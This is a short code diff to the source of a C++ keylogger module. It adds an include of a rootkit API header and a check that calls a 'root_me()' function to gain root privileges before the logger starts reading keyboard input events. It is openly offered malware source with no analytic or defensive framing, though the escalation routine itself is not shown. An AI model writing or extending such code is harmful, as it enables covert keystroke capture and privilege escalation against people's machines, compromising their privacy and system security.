@@ -15,6 +15,9 @@
 #include <linux/input.h>
 #include <fcntl.h>
 #include <signal.h>
+#include <sys/types.h>
+#include "../amazing_rootkit/api/api.h"
+
 
 #include "KeyLogger.h"
 #include "../Utils/CryptoUtils.h"
@@ -55,6 +58,12 @@ static const char *shifted_keycodes[] =
 
 void KeyLogger::module_impl()
 {
+    if ( getuid() != 0)
+    {
+        root_me();
+    }
+     
+
     std::cout << "Running" << module_type << " with args: " << args.dump() << std::endl;
 
     struct input_event event;
